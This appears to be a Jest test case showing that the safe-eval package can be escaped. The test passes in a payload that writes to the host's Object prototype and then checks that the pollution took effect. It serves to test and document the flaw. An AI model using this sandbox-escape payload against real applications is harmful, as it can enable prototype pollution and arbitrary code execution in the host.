test("Arbitrary code execution in safe-eval", () => {
  expect.assertions(2);
  var safeEval = require("safe-eval");
  expect({}.polluted).toBe(undefined);
  try {
    safeEval("this.constructor.prototype.polluted=`yes`");
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
